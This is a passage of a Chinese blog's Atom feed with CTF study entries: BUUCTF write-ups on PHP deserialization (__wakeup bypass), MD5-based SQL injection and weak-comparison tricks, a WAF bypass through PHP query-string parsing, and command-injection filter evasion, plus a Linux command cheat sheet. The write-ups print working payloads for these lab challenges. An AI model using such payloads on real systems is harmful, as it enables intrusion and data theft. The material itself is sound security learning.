    <summary type="html">&lt;h3 id=&quot;Web1&quot;&gt;&lt;a href=&quot;#Web1&quot; class=&quot;headerlink&quot; title=&quot;Web1&quot;&gt;&lt;/a&gt;Web1&lt;/h3&gt;&lt;h4 id=&quot;0x01-扫描目录加注入&quot;&gt;&lt;a href=&quot;#0x01-扫描目录加注入&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="crypto" scheme="http://example.com/tags/crypto/"/>
    
    <category term="分组密码" scheme="http://example.com/tags/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81/"/>
    
    <category term="misc" scheme="http://example.com/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化与MD5碰撞</title>
    <link href="http://example.com/2020/11/25/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%8CMD5%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2020/11/25/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%8CMD5%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-11-25T09:41:10.000Z</published>
    <updated>2020-12-10T12:44:19.065Z</updated>
    
    <content type="html"><![CDATA[<h4 id="PHP反序列化，MD5绕过学习"><a href="#PHP反序列化，MD5绕过学习" class="headerlink" title="PHP反序列化，MD5绕过学习"></a>PHP反序列化，MD5绕过学习</h4><p>学习过程是通过刷题，来源：<a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p><h5 id="1-极客大挑战-2019-PHP"><a href="#1-极客大挑战-2019-PHP" class="headerlink" title="1.[极客大挑战 2019]PHP"></a>1.[极客大挑战 2019]PHP</h5><p>运行实例后，看到一个优秀的前端，提示网站备份，用dirsearch爆破目录</p><p>dirsearch下载：<a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></p><p>使用方法：</p><p>-u 指定url           </p><p>-e 指定语言</p><p>进入dirsearch目录后，Terminal执行语句：</p><p><code>python3 dirsearch.py -u http://9abbc68b-92fd-4e85-a2c3-5266994c0cdb.node3.buuoj.cn/ -e php</code></p><p>爆出来一大堆目录文件，只关注需要的备份文件<a href="http://www.zip/">www.zip</a></p><p>在url后面拼接  <code>/www.zip</code>  下载压缩文件包</p><p>打开压缩包后：</p><p>打开index.php:</p><p>index.php关键点</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line"><span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line"><span class="variable">$res</span>=unserialize(@<span class="variable">$select</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到需要get方法传select参数，后面又是反序列化函数，具体的还需要看class.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();     </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>根据代码的意思可以知道，只要password=100，username=admin，在执行__destruct()的时候可以获得flag，所以我们需要达成这些要求。但这里需要绕过     <code>_wakeup()方法</code></p><p>绕过方法：</p><p>这里就要用到CVE-2016-7124漏洞，<strong>当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</strong></p><p>代码：php在线编辑即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Name(<span class="string">&#x27;admin&#x27;</span>,<span class="number">100</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将新建的对象$a序列化后得到的结果：</p><p><code>O:4:&quot;Name&quot;:2:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</code></p><p>解读：</p><p>O:（object name length) : “object name”:  属性数量(只包括private,public,protected) ：{属性1数据类型：属性长度：“属性名”;属性1值的数据类型（此处为string)：长度：“值”；属性2（值的数据类型为int；…}</p><p>从上面所说，绕过wakeup（）方法需要修改属性个数大于原来的（2），此处可以改为4，payload:</p><p><code>?select=O:4:&quot;Name&quot;:4:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</code></p><p>尝试后发现不行，需要注意的是，因为这个变量的声明是private，其字段为私有字段，仅在其声明类中可见，在子类及对象实例中均不可见（c++好像也是这样，记不清了），因此字段名在序列化时会在字段名和类名的前面加上0（%00），字段长度也包括所加0的长度，如图（显示的是非打印字符）：</p><p>图中的方格处就是需要加%00的地方，构造新的payload如下：</p><p><code>?select=O:4:&quot;Name&quot;:4:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</code></p><hr><h5 id="2-BJDCTF2020-Easy-MD5"><a href="#2-BJDCTF2020-Easy-MD5" class="headerlink" title="2.[BJDCTF2020]Easy MD5"></a>2.[BJDCTF2020]Easy MD5</h5><p><strong>1.sql注入+MD5</strong></p><p>有输入框，随便输入后，可以看到是get方法传参，尝试报错注入，没反应，抓包看header有hint提示：</p><p>它将用户输入的参数md5后再代入sql查询语句进行后续的查询，所以我们就需要构造一个字符串，让它的md5的值为 ‘ or  …   ， ‘   将前面的的sql语句闭合,然后 or 后面的字符，只要 or 之后的字符第一个不是0，理论上就可以爆出表单内容（今天上网络安全课老师刚讲过：）），如图拼接后的sql语句应该类似这样子：</p><p><code>select * from admin where password=&#39;&#39;or&#39;......&#39;</code></p><p>突破点在md5($pass,true)这里，先来看看md5函数的用法：</p><p>可以通过如下的脚本获得所需明文：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>;;) </span><br><span class="line">&#123;  </span><br><span class="line">   <span class="keyword">for</span> (<span class="variable">$c</span> = <span class="number">0</span>; <span class="variable">$c</span> &lt; <span class="number">1000000</span>; <span class="variable">$c</span>++, <span class="variable">$i</span>++)  </span><br><span class="line">      <span class="keyword">if</span> (stripos(md5(<span class="variable">$i</span>, <span class="literal">true</span>), <span class="string">&#x27;\&#x27;or\&#x27;&#x27;</span>) !== <span class="literal">false</span>)   </span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;\nmd5(<span class="subst">$i</span>) = &quot;</span> . md5(<span class="variable">$i</span>, <span class="literal">true</span>) . <span class="string">&quot;\n&quot;</span>; </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;.&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"><span class="comment">//引用于 http://mslc.ctf.su/wp/leet-more-2010-oh-those-admins-writeup/</span></span><br></pre></td></tr></table></figure><p>常用的：<strong>ffifdyop</strong>，该字符串md5加密后若raw参数为True时会返回 <strong>‘or’6<trash></strong> (<trash>其实就是一些乱码和不可见字符，这里只要第一位是非零数字即可被判定为True，后面的’’<trash>会在MySQL将其转换成整型比较时丢掉)</p><p>所以如果这里我们输入ffifdyop，后端的SQL语句会变成：</p><p><code>select * from admin where password=&#39;&#39;or&#39;6&lt;trash&gt;&#39;</code> </p><p>成功构造后即进入下一关：</p><p> <strong>2.<u>php，MD5的弱类型比较</u></strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">$a = $GET[&#x27;a&#x27;];</span></span><br><span class="line"><span class="comment">$b = $_GET[&#x27;b&#x27;];</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">if($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span></span><br><span class="line"><span class="comment">    // wow, glzjin wants a girl friend.</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><h5 id="get传参，两个参数-a-b，要求如下："><a href="#get传参，两个参数-a-b，要求如下：" class="headerlink" title="get传参，两个参数$a,$b，要求如下："></a>get传参，两个参数$a,$b，要求如下：</h5><h5 id="要求a和b明文值不同，但md5值相同，注意这里是两个等于号，是弱相等，所以我们可以利用PHP的弱类型比较突破，寻找两个明文不同但md5值为”0exxxxx”的字符串"><a href="#要求a和b明文值不同，但md5值相同，注意这里是两个等于号，是弱相等，所以我们可以利用PHP的弱类型比较突破，寻找两个明文不同但md5值为”0exxxxx”的字符串" class="headerlink" title="要求a和b明文值不同，但md5值相同，注意这里是两个等于号，是弱相等，所以我们可以利用PHP的弱类型比较突破，寻找两个明文不同但md5值为”0exxxxx”的字符串:"></a>要求a和b明文值不同，但md5值相同，注意这里是两个等于号，是弱相等，所以我们可以利用PHP的弱类型比较突破，寻找两个<strong>明文不同但md5值为”0exxxxx”的字符串</strong>:</h5><p>如：<u>QNKCDZO       ，      s214587387a</u></p><p><strong>3.数组绕过</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]&amp;&amp;md5(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>])===md5(<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>post方法传参，要求param1 和  param2 类型不同，但MD5后的值和类型都相同！2中的方法没办法通过。</p><p>因为md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。</p><p>所以直接POST传入param1[]=1&amp;param2[]=2即可得到，可使用hackbar插件，google和firefox里都有。</p><p>参考php的一些特性：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">md5(<span class="keyword">array</span>()) = <span class="literal">null</span></span><br><span class="line">sha1(<span class="keyword">array</span>()) = <span class="literal">null</span>    </span><br><span class="line">ereg(pattern,<span class="keyword">array</span>()) = <span class="literal">null</span> vs preg_match(pattern,<span class="keyword">array</span>) = <span class="literal">false</span></span><br><span class="line">strcmp(<span class="keyword">array</span>(), <span class="string">&quot;abc&quot;</span>) = <span class="literal">null</span></span><br><span class="line">strpos(<span class="keyword">array</span>(),<span class="string">&quot;abc&quot;</span>) = <span class="literal">null</span></span><br><span class="line"></span><br><span class="line">引用自 https:<span class="comment">//blog.csdn.net/q1352483315/article/details/89469928</span></span><br></pre></td></tr></table></figure><h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p>今天这两道ctf题主要考察点是，php反序列化漏洞（wakeup()方法的绕过），sql注入的基本原理，get,post方法传参，以及MD5函数特性，数组绕过等，两道题只是简单的入门了解，后面还需继续加深才是！</p><p>参考：</p><p><a href="https://xz.aliyun.com/t/3674#toc-5">https://xz.aliyun.com/t/3674#toc-5</a></p><p><a href="https://www.cnblogs.com/yesec/p/12535534.html">https://www.cnblogs.com/yesec/p/12535534.html</a></p><p><a href="https://blog.csdn.net/qq_42967398/article/details/104522626">https://blog.csdn.net/qq_42967398/article/details/104522626</a></p><p><a href="https://segmentfault.com/a/1190000022534926">https://segmentfault.com/a/1190000022534926</a></p><p><a href="https://blog.csdn.net/q1352483315/article/details/89469928">https://blog.csdn.net/q1352483315/article/details/89469928</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;PHP反序列化，MD5绕过学习&quot;&gt;&lt;a href=&quot;#PHP反序列化，MD5绕过学习&quot; class=&quot;headerlink&quot; title=&quot;PHP反序列化，MD5绕过学习&quot;&gt;&lt;/a&gt;PHP反序列化，MD5绕过学习&lt;/h4&gt;&lt;p&gt;学习过程是通过刷题，来源：&lt;a hr</summary>
      
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Linux Command</title>
    <link href="http://example.com/2020/11/23/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <id>http://example.com/2020/11/23/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</id>
    <published>2020-11-23T13:41:10.000Z</published>
    <updated>2020-12-10T12:43:28.663Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Linux常用命令"><a href="#Linux常用命令" class="headerlink" title="Linux常用命令"></a>Linux常用命令</h3><h5 id="1-文件命令"><a href="#1-文件命令" class="headerlink" title="1.文件命令"></a>1.文件命令</h5><p><code>ls</code>  -列出目录</p><p><code>ls -al </code> -使用格式化列出隐藏文件</p><p><code>cd dir</code> 更改目录到dir</p><p><code>cd</code> -更改目录到home</p><p><code>pwd</code> -显示当前目录</p><p><code>mkdir dir</code> – 创建目录 dir</p><p><code>rm file</code> – 删除 file </p><p><code>rm -r dir</code> – 删除目录 dir </p><p><code>rm -f file</code> – 强制删除 file </p><p><code>rm -rf dir</code> – 强制删除目录 dir * </p><p><code>cp file1 file2</code> – 将 file1 复制到 file2 </p><p><code>cp -r dir1 dir2</code> – 将 dir1 复制到 dir2; 如果 dir2 不存 在则创建它 </p><p><code>mv file1 file2</code> – 将 file1 重命名或移动到 file2; 如果 file2 是一个存在的目录则将 file1 移动到目录 file2 中 </p><p><code>ln -s file link</code> – 创建 file 的符号连接 link </p><p><code>touch file</code> – 创建 file </p><p><code>cat &gt; file</code> – 将标准输入添加到 file </p><p><code>more file</code> – 查看 file 的内容 </p><p><code>head file</code> – 查看 file 的前 10 行 </p><p><code>tail file</code> – 查看 file 的后 10 行 </p><p><code>tail -f file</code> – 从后 10 行开始查看 file 的内容</p><h5 id="2-进程管理"><a href="#2-进程管理" class="headerlink" title="2.进程管理"></a>2.进程管理</h5><p><code>ps</code> – 显示当前的活动进程 </p><p><code>top</code> – 显示所有正在运行的进程</p><p><code>kill pid</code> – 杀掉进程 id pid </p><p><code>killall proc</code> – 杀掉所有名为 proc 的进程 * </p><p><code>bg</code> – 列出已停止或后台的作业 </p><p><code>fg</code> – 将最近的作业带到前台 </p><p><code>fg n</code> – 将作业 n 带到前台</p><h5 id="3-文件权限"><a href="#3-文件权限" class="headerlink" title="3.文件权限"></a>3.文件权限</h5><p><code>chmod octal file</code> – 更改 file 的权限 </p><p><code>● 4 – 读 (r)</code> </p><p><code>● 2 – 写 (w)</code> </p><p><code>● 1 – 执行 (x)</code> </p><p>示例: </p><p><code>chmod 777 – 为所有用户添加读、写、执行权限</code> </p><p><code>chmod 755 – 为所有者添加 rwx 权限, 为组和其他用户添加 rx 权限.</code></p><h5 id="4-SSH"><a href="#4-SSH" class="headerlink" title="4.SSH"></a>4.SSH</h5><p><code>ssh user@host</code> – 以 user 用户身份连接到 host </p><p><code>ssh -p port user@host</code> – 在端口 port 以 user 用户身份连接到 host </p><p><code>ssh-copy-id user@host</code> – 将密钥添加到 host 以实现无密码登录</p><h5 id="5-搜索"><a href="#5-搜索" class="headerlink" title="5.搜索"></a>5.搜索</h5><p><code>grep pattern files</code> – 搜索 files 中匹配 pattern 的内容</p><p><code>grep -r pattern dir</code> – 递归搜索 dir 中匹配 pattern 的 内容 </p><p><code>command | grep pattern</code> – 搜索 command 输出中匹配 pattern 的内容</p><p><code>date</code> – 显示当前日期和时间 </p><p><code>cal</code> – 显示当月的日历 </p><p><code>uptime</code> – 显示系统从开机到现在所运行的时间 </p><p><code>w</code> – 显示登录的用户 </p><p><code>whoami</code> – 查看你的当前用户名 </p><p><code>finger user</code> – 显示 user 的相关信息 </p><p><code>uname -a</code> – 显示内核信息 </p><p><code>cat /proc/cpuinfo</code> – 查看 cpu 信息 </p><p><code>cat /proc/meminfo</code> – 查看内存信息 </p><p><code>man command</code> – 显示 command 的说明手册 </p><p><code>df</code> – 显示磁盘占用情况 </p><p><code>du</code> – 显示目录空间占用情况 </p><p><code>free</code> – 显示内存及交换区占用情况</p><h5 id="6-压缩"><a href="#6-压缩" class="headerlink" title="6.压缩"></a>6.压缩</h5><p><code>tar cf file.tar files</code> – 创建包含 files 的 tar 文件 </p><p><code>file.tar tar xf file.tar</code> – 从 file.tar 提取文件 </p><p><code>tar czf file.tar.gz files</code> – 使用 Gzip 压缩创建 tar 文件 </p><p><code>tar xzf file.tar.gz</code> – 使用 Gzip 提取 tar 文件 </p><p><code>tar cjf file.tar.bz2</code> – 使用 Bzip2 压缩创建 tar 文件 </p><p><code>tar xjf file.tar.bz2</code> – 使用 Bzip2 提取 tar 文件 </p><p><code>gzip file</code> – 压缩 file 并重命名为 file.gz </p><p><code>gzip -d file.gz</code> – 将 file.gz 解压缩为 file</p><h5 id="7-网络"><a href="#7-网络" class="headerlink" title="7.网络"></a>7.网络</h5><p><code>ping host – ping host</code> 并输出结果 </p><p><code>whois domain</code> – 获取 domain 的 whois 信息 </p><p><code>dig domain</code> – 获取 domain 的 DNS 信息 </p><p><code>dig -x host</code> – 逆向查询 host </p><p><code>wget file</code> – 下载 file </p><p><code>wget -c file</code> – 断点续传</p><h5 id="8-快捷键"><a href="#8-快捷键" class="headerlink" title="8.快捷键"></a>8.快捷键</h5><p><code>Ctrl+C</code> – 停止当前命令 </p><p><code>Ctrl+Z</code> – 停止当前命令，并使用 fg 恢复 </p><p><code>Ctrl+D</code> – 注销当前会话，与 exit 相似 </p><p><code>Ctrl+W</code> – 删除当前行中的字 </p><p><code>Ctrl+U</code> – 删除整行 </p><p><code>!!</code> - 重复上次的命令 </p><p><code>exit</code> – 注销当前会话</p><p><code>Ctrl+Shift+C</code> -复制选中内容</p><p><code>Ctrl+Shift+V 或 Shift+ins 或单击鼠标滚轮</code>  -粘贴已选内容</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;Linux常用命令&quot;&gt;&lt;a href=&quot;#Linux常用命令&quot; class=&quot;headerlink&quot; title=&quot;Linux常用命令&quot;&gt;&lt;/a&gt;Linux常用命令&lt;/h3&gt;&lt;h5 id=&quot;1-文件命令&quot;&gt;&lt;a href=&quot;#1-文件命令&quot; class=&quot;head</summary>
      
    
    
    
    <category term="OS" scheme="http://example.com/categories/OS/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="Linux" scheme="http://example.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF刷题</title>
    <link href="http://example.com/2020/11/21/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>http://example.com/2020/11/21/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2020-11-21T03:41:10.000Z</published>
    <updated>2020-12-10T12:42:25.497Z</updated>
    
    <content type="html"><![CDATA[<h4 id="BUUCTF刷题记录"><a href="#BUUCTF刷题记录" class="headerlink" title="BUUCTF刷题记录"></a>BUUCTF刷题记录</h4><h5 id="1-RoarCTF-2019-Easy-Calc"><a href="#1-RoarCTF-2019-Easy-Calc" class="headerlink" title="1.[RoarCTF 2019]Easy Calc"></a>1.[RoarCTF 2019]Easy Calc</h5><p>有waf，基本思路就想到过waf，危险函数传参。</p><p>源代码中发现有calc.php的页面：</p><p> 在url后添加“calc.php”访问，php代码审计：</p><p>接收的参数为num，看到过滤规则首个就是过滤空格</p><p>构造如下：calc.php?空格num=phpinfo(); 这样，会先触发规则，删除空格，进而将一个名称为num的参数传入</p><p>成功</p><p>进一步读取目录，否则仍是找不到flag</p><p>由于过滤了“/”符号，我们用ASCII码替换</p><p>补充：</p><p>​     scandir() 函数返回指定目录中的文件和目录的数组。</p><p>​     var_dump()函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，      通过缩进显示其结构。</p><p>f1agg字符串，file_get_contents()直接读取即可。</p><p>php的字符串运算符示例：</p><p><code>&lt;?php      $a=&#39;this is a test&#39;;     $a.=chr(78).chr(98);     echo $a;      ?&gt;</code></p><p>有两个字符串运算符，连接运算符为’ . ‘, 其返回左右两参数的拼接结果， 连接赋值运算符为 ‘ .= ‘，其是将运算符右侧参数拼接到左侧参数（string）的后面。</p><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>题目比较简单，主要考察对于php字符串的解析特性</p><p>我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] =&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] =&gt; 42)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</p><p>/news.php?%20news[id%00=42”+AND+1=0–</p><p>上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。</p><h5 id="2-GXYCTF2019-Ping-Ping-Ping"><a href="#2-GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="2.[GXYCTF2019]Ping Ping Ping"></a>2.[GXYCTF2019]Ping Ping Ping</h5><p>这个题是Ping命令注入</p><p>传参：?ip=localhost|ls</p><p>| (管道符号)的作用是将| 的作用是将前一个命令的结果传递给后一个命令作为输入；</p><p>ls(list files)：列出当前目录下子目录及所含文件</p><p>继续传参：?ip=localhost|cat%20index.php</p><p>可以看出过滤了空格，尝试绕过，绕过空格的思路一般有：</p><p><code>$IFS</code>,<code>IFS的默认值为：空白（包括：空格，tab, 和新行)</code></p><p><code>$&#123;IFS&#125;，&lt;，&lt;&gt;,</code></p><p> <code>&#123;cat,flag.php&#125; //用逗号实现了空格功能,%20,%09</code></p><p>``$IFS$1`   //$1改成$加其他数字貌似都行</p><p>可以看到对我们的输入进行了过滤，在flag匹配里面不能将flag连写，同时覆盖$a变量</p><p>变量拼接:    ?ip=localhost;a=g;cat$IFS$1fla$a.php;</p><p>查看源代码里面就有flag</p><p>除此外，我们可以尝试使用反引号内联执行的做法，linux下反引号``里面包含的就是需要执行的系统命令</p><p>反引号里面的系统命令会先执行，成功执行后将结果传递给调用它的命令</p><p>查看源代码可以看到index.php和flag.php的内容全部显示。</p><h4 id="总结：-1"><a href="#总结：-1" class="headerlink" title="总结："></a>总结：</h4><p>主要考察命令注入的常见绕过姿势，及php语法规则。</p><p><a href="https://xz.aliyun.com/t/3918">https://xz.aliyun.com/t/3918</a></p><p><a href="https://www.cnblogs.com/wangtanzhi/p/12246386.html#autoid-0-0-0">https://www.cnblogs.com/wangtanzhi/p/12246386.html#autoid-0-0-0</a></p><p><a href="https://www.cnblogs.com/Cl0ud/p/12313368.html">https://www.cnblogs.com/Cl0ud/p/12313368.html</a></p><p><a href="https://chen.oinsm.com/2020/01/10/GXYCTF-2019-%E5%A4%8D%E7%8E%B0/">https://chen.oinsm.com/2020/01/10/GXYCTF-2019-%E5%A4%8D%E7%8E%B0/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;BUUCTF刷题记录&quot;&gt;&lt;a href=&quot;#BUUCTF刷题记录&quot; class=&quot;headerlink&quot; title=&quot;BUUCTF刷题记录&quot;&gt;&lt;/a&gt;BUUCTF刷题记录&lt;/h4&gt;&lt;h5 id=&quot;1-RoarCTF-2019-Easy-Calc&quot;&gt;&lt;a href</summary>
      
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>MSF永恒之蓝(Eternalblue)漏洞利用</title>
